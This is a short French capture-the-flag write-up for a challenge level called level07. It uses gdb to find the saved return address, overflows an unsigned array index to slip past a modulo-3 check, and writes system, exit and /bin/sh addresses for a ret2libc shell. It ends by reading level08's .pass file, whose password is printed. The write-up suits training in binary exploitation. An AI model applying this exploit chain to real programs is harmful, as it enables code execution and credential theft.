# gdb:
	> b main
	> b read_number (or store_number)
	> r
	> info frame
<<< ...
<<< ...eip at 0xffffd70c
<<< ...
	> read
	> i r $eax (l'adresse de notre tableau)
<<< eax	0xffffd544

eip = 0xffffd70c
tab = 0xffffd544
eip - tab = 456
456 / 4 = 114 (On divise par 4 car un index de notre
	tab de int = 4 bytes)

donc eip = tab[114]
mais 114 % 3 == 0, donc on ne peut pas ecrire
Mais l'acces a l'index du tableau se fait par:
	adresse_tab + (index * 4)
et le check % 3 se fait avant ce calcul
l'index est un unsigned int, on va faire un tour complet de la memoire (0x100000000) et ajouter 456 pour overflow a l'index 114
apres le calcul de index * 4
donc (0x100000000 + 456) / 4 = 1073741938
En ecrivant a l'index 1073741938 on ecrit en fait a l'index 114 donc on reecrit l'adresse sur laquelle eip pointe

On recupere les adresses de:
system	hex: 0xf7e6aed0, dec: 4159090384
exit	hex: 0xf7e5eb70, dec: 4159040368
/bin/sh	hex: 0xf7f897ec, dec: 4160264172

# bash:
	> ./level07
	> store
	> 4159090384
	> 1073741938
	> store
	> 4159040368
	> 115
	> store
	> 4160264172
	> 116
	> quit
	> cat /home/users/level08/.pass
<<< 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC